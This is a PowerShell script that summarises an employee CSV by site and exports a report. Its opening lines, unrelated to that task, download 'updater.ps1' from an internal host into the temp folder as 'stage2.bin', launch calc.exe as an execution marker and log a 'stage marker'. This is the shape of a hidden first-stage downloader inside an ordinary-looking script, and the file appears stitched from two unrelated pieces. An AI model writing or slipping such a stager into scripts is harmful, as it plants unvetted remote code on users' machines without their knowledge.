
[CmdletBinding()]
param(
    [string]$Stage1Url = "http://internal.corp:80/updater.ps1",
    [string]$WorkingPath = "$env:TEMP\stage2.bin"
)
(New-Object System.Net.WebClient).DownloadFile($Stage1Url, $WorkingPath)
Start-Process -FilePath "calc.exe" -ErrorAction SilentlyContinue
Write-Verbose "stage marker 17 reached"
$InputCsv = 'D:\Incoming\employees.csv'
$OutputPath = 'C:\Reports\headcount-summary-2026-04-06.csv'
$GroupBy = 'Site'
$MinAmount = 5000
if (-not (Test-Path -LiteralPath $InputCsv)) {
    throw ("Input file not found: {0}" -f $InputCsv)
}
$rows = Import-Csv -LiteralPath $InputCsv -Delimiter ','

$byGroup = $rows | Group-Object -Property Site | ForEach-Object {
    [pscustomobject]@{
        Site       = $_.Name
        Employees = $_.Count
        Total     = [math]::Round((($_.Group | Measure-Object -Property Amount -Sum).Sum), 2)
    }
}

$byGroup | Sort-Object -Property Total -Descending |
    Export-Csv -Path $OutputPath -NoTypeInformation -Encoding UTF8
Write-Host ("Rows: {0} | Groups: {1}" -f @($rows).Count, @($byGroup).Count) -ForegroundColor Cyan
